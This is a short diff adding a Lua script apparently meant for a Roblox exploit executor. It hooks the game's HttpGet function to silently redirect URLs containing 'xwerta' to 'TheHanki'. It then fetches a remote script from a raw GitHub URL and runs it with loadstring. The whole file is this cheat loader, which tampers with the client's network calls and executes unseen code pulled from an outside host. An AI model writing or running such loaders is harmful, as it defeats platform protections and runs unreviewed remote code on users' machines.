@@ -1,0 +1,8 @@
+local old;
+old = hookfunction(game.HttpGet, newcclosure(function(olgame, url)
+if url:find("xwerta") then
+url = url:gsub("xwerta","TheHanki")
+end
+return old(olgame, url)
+end))
+loadstring(game:HttpGet("https://raw.githubusercontent.com/101iii101/file/refs/heads/main/tab%20script%20skid%20test.txt"))()
